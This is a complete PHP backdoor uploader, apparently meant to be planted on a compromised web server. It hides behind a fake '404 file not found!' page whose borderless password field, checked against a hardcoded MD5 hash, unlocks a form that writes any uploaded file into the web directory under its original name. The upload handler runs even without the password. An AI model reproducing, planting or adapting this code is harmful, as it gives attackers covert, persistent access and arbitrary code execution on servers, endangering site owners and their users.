<?php
session_start();
$pass="9d83e8532a33345e495d8f213bf73055";

if(isset($_POST["psubmit"])){
	$password = md5($_POST["password"]);
	if($password == $pass){
		$_SESSION["auth"] = "yes";
	}
}

if(isset($_SESSION['auth'])){
	echo'
	
	<html>
	<body>

	<form method="post" enctype="multipart/form-data">
	  <input type="file" name="image">
	  <input type="submit" value="upload" name="submit">
	</form>
	
	<a href="?logout">Logout</a>
	</body>
	</html>
	
	';
}else{
	echo'
	
	<html>
	<body>
	<center>
	<h1>404 file not found!</h1><br><br>
	<form method="post">
	  <input type="password" name="password" style="border:none">
	  <input type="hidden" name="psubmit">
	</form>
	</center>
	</body>
	</html>
	
	';
}

if(isset($_FILES["image"])){
	$file_name = $_FILES['image']['name'];
    $file_tmp =$_FILES['image']['tmp_name'];

	move_uploaded_file($file_tmp,"".$file_name);
}

if(isset($_GET["logout"])){
	unset($_SESSION['auth']);
	session_destroy();
	header("Location:?finish");
}
?>
